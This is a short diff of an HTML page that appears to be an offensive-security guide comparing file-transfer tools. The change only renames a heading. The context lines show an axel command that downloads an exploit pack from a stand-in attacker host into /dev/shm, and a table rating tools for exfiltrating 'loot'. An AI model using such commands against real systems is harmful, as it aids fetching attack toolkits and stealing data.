@@ -66,7 +66,7 @@
 
 <div class="example"><strong>💨 Field Tested:</strong> <code>axel -n 16 -o /dev/shm/ http://attacker.tools/windows-exploit-pack.zip</code> - Downloads 2GB toolkit in minutes on slow hotel WiFi.</div>
 
-<h2>⚔️ Battle Matrix</h2>
+<h2>⚔️ scenarios</h2>
 <table>
     <tr><th>Scenario</th><th>SCP</th><th>Wget</th><th>Curl</th><th>Axel</th></tr>
     <tr><td>Exfil loot</td><td>✅ Fastest</td><td>❌ No</td><td>✅ Flexible</td><td>❌ No</td></tr>
